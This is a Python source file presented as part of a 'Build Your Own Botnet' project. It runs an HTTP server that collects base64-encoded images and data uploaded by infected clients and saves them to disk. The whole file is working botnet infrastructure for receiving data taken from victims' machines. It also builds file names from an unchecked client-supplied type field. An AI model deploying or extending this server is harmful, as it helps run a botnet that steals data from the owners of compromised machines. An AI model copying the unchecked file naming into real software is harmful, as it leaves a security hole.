#!/usr/bin/python
'POST Request Handler (Build Your Own Botnet)'

# standard library
import os
import sys
import json
import string
import base64
import random
if sys.version_info[0] < 3:
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
else:
    from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    """
    HTTP POST request handler for clients uploading
    captured images/data to the server

    """
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        """
        Handle incoming HTTP POST request

        """
        self._set_headers()
        self.data_string = self.rfile.read(int(self.headers['Content-Length']))
        self.send_response(200)
        self.end_headers()

        json_data = json.loads(self.data_string)

        b64_data = json_data.get('data')
        ftype = json_data.get('type')

        data = base64.b64decode(b64_data)

        output_dir = 'output'
        if not os.path.isdir(output_dir):
            os.makedirs(output_dir)

        fname = str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]) + '.' + ftype
        output_path = os.path.join(output_dir, fname)

        with open(output_path, 'wb') as fp:
            fp.write(data)


def run(server_class=HTTPServer, handler_class=Handler, port=80):
    httpd = server_class(('0.0.0.0', port), handler_class)
    httpd.serve_forever()

def main():
    port = int(sys.argv[1])
    run(port=port)

if __name__ == '__main__':
    main()
